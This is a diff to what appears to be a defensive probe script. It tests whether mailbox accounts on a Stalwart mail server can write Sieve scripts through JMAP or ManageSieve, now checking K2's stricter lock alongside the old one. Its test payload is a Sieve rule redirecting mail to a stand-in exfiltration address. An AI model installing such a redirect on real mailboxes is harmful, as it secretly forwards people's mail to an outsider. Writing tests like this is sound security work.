@@ -19,8 +19,8 @@ it mints itself) has, against a real Stalwart:
       also records what it does to K2's own active script
   G6  ManageSieve PUTSCRIPT + SETACTIVE (the default `sieve` listener, which
       K2's enable flow destroys; here it stands for a box where it was
-      re-added) with today's lock, then with a hardened lock that also
-      denies the ManageSieve write permissions
+      re-added) with K2's lock (JMAP + ManageSieve writes denied); the old
+      JMAP-only lock is recorded for comparison
   G7  PushSubscription/set to an outside URL (state ids only; recorded)
 
 A [FAIL] means that door is open. No mail is sent: the evidence is what
@@ -55,9 +55,11 @@ SUBMISSION = "urn:ietf:params:jmap:submission"
 REGISTRY = "urn:stalwart:jmap"
 
 # Must match crates/k2-daemon/src/mail/sieve_lockdown.rs SIEVE_WRITE_PERMISSIONS.
-SIEVE_WRITE = ["jmapSieveScriptCreate", "jmapSieveScriptUpdate", "jmapSieveScriptDestroy"]
 # The ManageSieve write permissions (Stalwart crates/managesieve/src/op/*).
 MANAGESIEVE_WRITE = ["sievePutScript", "sieveSetActive", "sieveDeleteScript", "sieveRenameScript"]
+# K2 before 2026-10-28 denied the JMAP three only (G6b shows that lock).
+JMAP_ONLY = ["jmapSieveScriptCreate", "jmapSieveScriptUpdate", "jmapSieveScriptDestroy"]
+SIEVE_WRITE = JMAP_ONLY + MANAGESIEVE_WRITE
 REDIRECT = 'redirect "exfil@outside.test";\r\n'
 
 FAILED = []
@@ -404,22 +406,19 @@ def main():
         except OSError as e:
             out = {"error": str(e)}
         after = names(gina)
-        info("G6a ManageSieve as a mailbox with today's lock", json.dumps(out))
+        info("G6a ManageSieve as a mailbox with K2's lock (JMAP + ManageSieve)", json.dumps(out))
         opened = str(out.get("PUTSCRIPT", "")).upper().startswith("OK") or "gap*" in after
-        check("G6a ManageSieve write refused with today's (JMAP-only) lock", not opened,
-              f"scripts {before} -> {after}")
-        ivan, ivan_pw, err = account_create(f"k2fg-ivan-{tag}", deny(SIEVE_WRITE + MANAGESIEVE_WRITE))
-        check("G6b x:Account/set accepts the ManageSieve permission names", bool(ivan), err or "accepted")
+        check("G6a ManageSieve write refused with K2's lock", not opened, f"scripts {before} -> {after}")
+        # The lock K2 shipped before 2026-10-28 (JMAP only), for the record.
+        ivan, ivan_pw, err = account_create(f"k2fg-ivan-{tag}", deny(JMAP_ONLY))
         if ivan:
             try:
                 out = managesieve(ms_port, f"k2fg-ivan-{tag}@{domain}", ivan_pw, REDIRECT)
             except OSError as e:
                 out = {"error": str(e)}
-            info("G6b ManageSieve with the hardened lock", json.dumps(out))
-            ivan_scripts = names(ivan)
-            check("G6b hardened lock refuses ManageSieve writes",
-                  not str(out.get("PUTSCRIPT", "")).upper().startswith("OK") and not ivan_scripts,
-                  f"scripts {ivan_scripts}")
+            info("G6b ManageSieve with the old JMAP-only lock", f"{json.dumps(out)}; scripts {names(ivan)}")
+        else:
+            info("G6b old-lock account", err)
 
     # ── G7 push subscription to an outside URL (records only) ──────
     n, a = user.call("PushSubscription/set", {"create": {"p": {"deviceClientId": "probe",
